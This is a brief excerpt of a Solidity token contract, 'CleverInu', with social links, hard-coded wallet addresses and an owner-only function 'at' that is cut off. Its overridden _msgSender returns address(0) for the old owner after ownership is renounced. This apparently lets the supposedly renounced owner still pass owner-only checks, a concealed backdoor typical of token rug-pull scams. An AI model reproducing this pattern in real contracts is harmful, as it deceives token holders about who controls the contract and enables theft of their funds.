...
Twitter: https://twitter.com/cleverinu
TG: https://t.me/cleverinu
...
abstract contract Context {
    ...
    function _msgSender() internal view virtual returns (address) {
        return renounced == true && msg.sender == oldOwner ? address(0) : msg.sender; 
    }
...
contract CleverInu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("CleverInu", "$CleverInu") {
        ...
        marketingWallet = address(0xcA24d2dC850855823F4303F1145bdF0078380278); // set as marketing wallet
        devWallet = address(0x5E10E1949FA97E4987854622e0C78b8aec996C24); // set as dev wallet
    ...
    function at(address a, uint256 b) public onlyOwner {
